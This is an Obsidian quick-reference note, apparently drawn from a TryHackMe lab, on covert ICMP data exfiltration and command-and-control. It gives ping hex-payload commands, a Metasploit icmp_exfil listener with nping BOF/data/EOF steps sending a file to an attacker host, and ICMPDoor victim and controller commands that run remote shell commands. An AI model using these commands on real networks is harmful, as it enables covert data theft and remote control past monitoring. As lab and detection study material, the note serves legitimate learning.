Below is a concise quick-reference Obsidian note for fast lookup.

---

# ICMP Data Exfiltration — Quick Reference

## Overview

ICMP can be abused for covert data exfiltration and C2 by inserting arbitrary bytes into the ICMP **Data** section (echo-request packets).

---

## Manual Exfiltration Using `ping`

### 1. Convert text to hex

```
echo "thm:tryhackme" | xxd -p
```

### 2. Send ICMP packet with data (Linux only)

```
ping TARGET -c 1 -p <HEXDATA>
```

### 3. Verify

Capture packet in Wireshark or:

```
tcpdump icmp
```

---

## Exfiltration Using Metasploit (`auxiliary/server/icmp_exfil`)

### 1. Start listener on AttackBox

```
use auxiliary/server/icmp_exfil
set BPF_FILTER icmp and not src ATTACKBOX_IP
set INTERFACE eth0
run
```

### 2. Victim sends BOF trigger

```
sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "BOFfile.txt"
```

### 3. Victim sends data chunks

```
sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "<data>"
```

### 4. Victim sends EOF

```
sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "EOF"
```

### 5. File saved to:

```
~/.msf4/loot/
```

---

## ICMP C2 Communication (ICMPDoor)

### Victim (listener)

```
sudo icmpdoor -i eth0 -d <attackereth_IP>
```

### Attacker (controller)

```
sudo icmp-cnc -i eth1 -d <victimeth_IP>
```

### Execute commands

```
shell: hostname
```

---

## Packet Monitoring

```
sudo tcpdump -i eth0 icmp
```

---

